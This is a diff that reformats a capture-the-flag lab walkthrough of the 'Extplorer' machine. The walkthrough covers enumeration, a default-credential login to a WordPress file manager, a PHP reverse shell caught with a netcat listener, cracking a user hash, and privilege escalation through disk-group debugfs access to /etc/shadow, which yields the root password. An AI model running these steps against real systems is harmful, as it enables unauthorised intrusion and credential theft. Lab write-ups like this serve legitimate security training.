@@ -3,7 +3,7 @@
 # 🐧Extplorer🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -p- -T4 -sV 192.168.237.16
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-07 20:39 AEDT
 PORT   STATE SERVICE VERSION
@@ -13,7 +13,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 port 80 is running a wordpress  
 use feroxbuster and found the filemanager
-```
+```console
 $ feroxbuster -u http://192.168.237.16 -w /usr/share/wordlists/dirb/common.txt -x php,txt,xml,zip
  ___  ___  __   __     __      __         __   ___
 |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
@@ -40,10 +40,10 @@ by Ben "epi" Risher 🤓                 ver: 2.13.0
 ```
 logged in with default credential admin admin  
 we can upload php reverse shell on filemanager
-```
+```console
 http://192.168.237.16/wp-content/plugins/php-reverse-shell.php
 ```
-```
+```console
 $ nc -lvnp 80
 listening on [any] 80 ...
 connect to [192.168.45.201] from (UNKNOWN) [192.168.237.16] 59620
@@ -53,7 +53,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 we found there is a unusual file call .htusers.php in filemanager  
 and it has the pass hash of user dora
-```
+```console
 www-data@dora:/var/www/html/filemanager/config$ ls -la
 ls -la
 total 36
@@ -76,7 +76,7 @@ www-data@dora:/var/www/html/filemanager/config$ cat .htusers.php
 ```
 use john the ripper to crack the hash
 the password is doraemon
-```
+```console
 $ john --wordlist=/home/ming/Downloads/rockyou.txt hash.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
@@ -86,7 +86,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 doraemon         (?)     
 ```
 switch user to dora
-```
+```console
 www-data@dora:/var/www/html/filemanager/config$ su dora
 Password: doraemon
 
@@ -100,7 +100,7 @@ User dora is a group member of disk
 In Linux, the disk group allows raw read/write access to sensitive data even you don't have permission  
 https://www.hackingarticles.in/disk-group-privilege-escalation/  
 First, check the disk space summary
-```
+```console
 dora@dora:/var/www/html/filemanager/config$ df -h  
 Filesystem                         Size  Used Avail Use% Mounted on
 /dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.2G  55% /
@@ -120,7 +120,7 @@ tmpfs                              199M     0  199M   0% /run/user/1000
 root should mount on the largest disk which is /dev/mapper/ubuntu--vg-ubuntu--lv  
 
 use debugfs function and make test directory to check the sensitive file like /etc/shadow
-```
+```console
 $ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
 debugfs 1.45.5 (07-Jan-2020)
 
@@ -133,7 +133,7 @@ root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D
 ```
 we got the hash of root  
 crack it offline with john the ripper 
-```
+```console
 $ john --wordlist=/home/ming/Downloads/rockyou.txt hash.txt
 Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
 Use the "--format=HMAC-SHA256" option to force loading these as that type instead
@@ -146,7 +146,7 @@ explorer         (root)
 ```
 switch to root using the password explorer  
 and we got it
-```
+```console
 dora@dora: su root
 Password: explorer
 
